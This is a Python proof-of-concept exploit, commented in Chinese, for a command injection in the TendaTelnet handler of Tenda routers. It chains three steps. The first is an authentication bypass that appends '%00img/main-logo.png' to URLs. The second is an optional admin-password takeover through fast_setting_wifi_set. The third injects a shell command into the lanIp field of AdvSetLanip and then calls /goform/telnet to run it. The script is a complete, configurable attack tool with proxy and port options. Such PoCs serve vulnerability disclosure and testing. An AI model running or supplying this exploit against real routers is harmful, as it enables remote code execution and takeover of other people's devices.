#!/usr/bin/env python3
"""
PoC for TendaTelnet Command Injection Vulnerability

漏洞: TendaTelnet 函数中的命令注入
影响: 远程代码执行 (RCE)

增强点:
- 使用 argparse 增强 CLI，用法更灵活
- 代理、超时、SSL 校验开关可配置
- 支持跳过 fast_setting 接管，仅直接触发 telnet 接口
- 改进日志与异常处理
"""

import argparse
import requests
import sys
import random
import string
from typing import Optional, Dict

# 默认不使用代理；可通过 CLI 传入覆盖
DEFAULT_PROXIES: Optional[Dict[str, str]] = None


def build_auth_bypass_url(base_url: str, path: str, *, suffix: str = "%00img/main-logo.png") -> str:
    """Build an auth-bypass URL using the raw-url whitelist + decoded-path truncation trick."""
    if not path.startswith("/"):
        path = "/" + path
    # Example: /goform/telnet%00img/main-logo.png
    return f"{base_url}{path}{suffix}"

def random_string(length=8):
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def fast_setting_takeover(session, base_url, new_admin_password, ssid="test", wifi_password="QuickWifi123!", *, proxies=None, timeout=10):
    """
    通过 fast_setting_wifi_set 接口重置后台口令
    """
    url = f"{base_url}/goform/fast_setting_wifi_set"
    data = {
        "ssid": ssid,
        # "wrlPassword": wifi_password,
        "loginPwd": new_admin_password,
        "lanIp": "192.168.0.1",
        "lanMask": "255.255.255.0",
        "dhcpEn": "1",
        "startIp": "192.168.0.100",
        "endIp": "192.168.0.200",
        "leaseTime": "86400",
        "lanDnsAuto": "1"
    }

    print("[*] 尝试通过 fast_setting_wifi_set 重置后台密码...")
    try:
        resp = session.post(url, data=data, proxies=proxies, timeout=timeout)
        print(f"[+] fast_setting_wifi_set 响应: {resp.status_code},password: {new_admin_password}")
        print(f"[+] 响应内容: {resp.text[:200]}")
        return resp.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"[-] fast_setting_wifi_set 请求异常: {e}")
        return False


def login_with_new_password(session, base_url, password, username="admin", *, proxies=None, timeout=10):
    """
    使用新的后台口令登录，获取有效 cookie
    """
    url = f"{base_url}/login/Auth"
    data = {
        "username": username,
        "password": password
    }
    print("[*] 使用新口令登录后台...")
    try:
        resp = session.post(url, data=data, proxies=proxies, timeout=timeout)
        print(f"[+] 登录响应: {resp.status_code}")
        print(f"[+] 登录内容: {resp.text[:200]}")
        if resp.status_code == 200:
            print("[+] Cookie 已写入 Session")
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] 登录请求异常: {e}")
        return False


def exploit_tendatelnet(
    target_ip,
    command="id",
    *,
    port=80,
    proxies=None,
    timeout=10,
    verify_ssl=False,
    skip_takeover=False,
    ssid="test",
    new_admin_password=None,
    auth_bypass=True,
):
    """
    利用 TendaTelnet 命令注入漏洞
    
    Args:
        target_ip: 目标路由器IP地址
        command: 要执行的命令（默认: id）
    """
    
    # 第一步：通过 AdvSetLanip 接口设置恶意的 lanIp
    # 注入命令: 在 IP 地址后添加命令注入载荷
    # 例如: "192.168.0.1; command; #"
    
    print(f"[*] 目标: {target_ip}")
    print(f"[*] 准备注入命令: {command}")
    
    session = requests.Session()
    session.verify = verify_ssl
    session.headers.update({"User-Agent": "Mozilla/5.0 (PoC-TendaTelnet)"})

    base_url = f"http://{target_ip}:{port}"
    takeover_password = new_admin_password or f"Pwn{random_string(6)}!"

    if auth_bypass:
        # When auth-bypass is enabled, the takeover/login flow is unnecessary.
        skip_takeover = True

    if not skip_takeover:
        # 先尝试利用 fast_setting_wifi_set 重置后台口令
        if not fast_setting_takeover(session, base_url, takeover_password, ssid=ssid, proxies=proxies, timeout=timeout):
            print("[-] fast_setting_wifi_set 调用失败，将尝试继续后续步骤（可能失败）")
        else:
            # 登录以拿到合法 cookie
            if not login_with_new_password(session, base_url, takeover_password, proxies=proxies, timeout=timeout):
                print("[-] 登录失败，后续请求可能继续被重定向")

    # 构造恶意 IP 地址（包含命令注入）
    # 使用分号分隔命令，并用 # 注释掉后续内容
    malicious_ip = f"192.168.0.1; {command}; #"
    
    # 设置 LAN IP 的接口
    if auth_bypass:
        set_lanip_url = build_auth_bypass_url(base_url, "/goform/AdvSetLanip")
    else:
        set_lanip_url = f"{base_url}/goform/AdvSetLanip"
    
    # 构造 POST 数据
    post_data = {
        "lanIp": malicious_ip,
        "lanMask": "255.255.255.0",
        "dhcpEn": "1",
        "startIp": "192.168.0.100",
        "endIp": "192.168.0.200",
        "leaseTime": "86400",
        "lanDnsAuto": "1"
    }
    
    print(f"[*] 步骤1: 设置恶意 lanIp 配置...")
    try:
        response = session.post(
            set_lanip_url,
            data=post_data,
            proxies=proxies,
            timeout=timeout,
        )
        print(f"[+] 配置设置响应: {response.status_code}")
        print(f"[+] 响应内容: {response.text[:200]}")
    except Exception as e:
        print(f"[-] 设置配置失败: {e}")
        return False
    
    # 第二步：调用 TendaTelnet 接口触发命令执行
    if auth_bypass:
        telnet_url = build_auth_bypass_url(base_url, "/goform/telnet")
    else:
        telnet_url = f"{base_url}/goform/telnet"
    
    print(f"[*] 步骤2: 触发 TendaTelnet 执行命令...")
    try:
        response = session.get(
            telnet_url,
            timeout=timeout,
            proxies=proxies,
        )
        print(f"[+] TendaTelnet 响应: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        
        if response.status_code == 200:
            print("[+] 命令可能已执行！")
            return True
    except Exception as e:
        print(f"[-] 触发失败: {e}")
        return False
    
    return False


def exploit_tendatelnet_direct(
    target_ip,
    command="id",
    *,
    port=80,
    proxies=None,
    timeout=10,
    verify_ssl=False,
    auth_bypass=True,
):
    """
    直接利用方法（如果 lan.ip 已经包含恶意内容）
    """
    base_url = f"http://{target_ip}:{port}"
    if auth_bypass:
        telnet_url = build_auth_bypass_url(base_url, "/goform/telnet")
    else:
        telnet_url = f"{base_url}/goform/telnet"
    
    print(f"[*] 直接触发 TendaTelnet...")
    try:
        response = requests.get(
            telnet_url,
            timeout=timeout,
            verify=verify_ssl,
            proxies=proxies,
        )
        print(f"[+] 响应: {response.status_code}")
        print(f"[+] 内容: {response.text}")
        return True
    except Exception as e:
        print(f"[-] 失败: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="TendaTelnet 命令注入漏洞 PoC",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("target", help="目标路由器 IP")
    parser.add_argument("command", nargs="?", default="id", help="注入执行的命令")
    parser.add_argument("--proxy", dest="proxy", default=None, help="HTTP/HTTPS 代理，如 http://127.0.0.1:7890")
    parser.add_argument("--port", type=int, default=80, help="目标端口")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    parser.add_argument("--verify-ssl", action="store_true", help="启用 SSL 证书校验")
    parser.add_argument("--skip-takeover", action="store_true", help="跳过 fast_setting 接管，仅进行注入与触发")
    parser.add_argument("--ssid", default="test", help="fast_setting 用于设置的 SSID")
    parser.add_argument("--new-admin-pass", dest="new_admin_pass", default=None, help="接管时设置的新后台口令")
    parser.add_argument("--direct", action="store_true", help="仅直接调用 /goform/telnet 触发")
    parser.add_argument(
        "--no-auth-bypass",
        action="store_true",
        help="禁用 %00 + 白名单子串 的认证绕过（用于对比测试）",
    )

    args = parser.parse_args()

    print("=" * 60)
    print("TendaTelnet 命令注入漏洞 PoC")
    print("=" * 60)
    print()

    # 禁用 InsecureRequestWarning（仅当未开启 verify-ssl 时）
    if not args.verify_ssl:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # 构建代理配置
    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    if args.direct:
        exploit_tendatelnet_direct(
            args.target,
            args.command,
            port=args.port,
            proxies=proxies,
            timeout=args.timeout,
            verify_ssl=args.verify_ssl,
            auth_bypass=not args.no_auth_bypass,
        )
        sys.exit(0)

    exploit_tendatelnet(
        args.target,
        args.command,
        port=args.port,
        proxies=proxies,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl,
        skip_takeover=args.skip_takeover,
        ssid=args.ssid,
        new_admin_password=args.new_admin_pass,
        auth_bypass=not args.no_auth_bypass,
    )

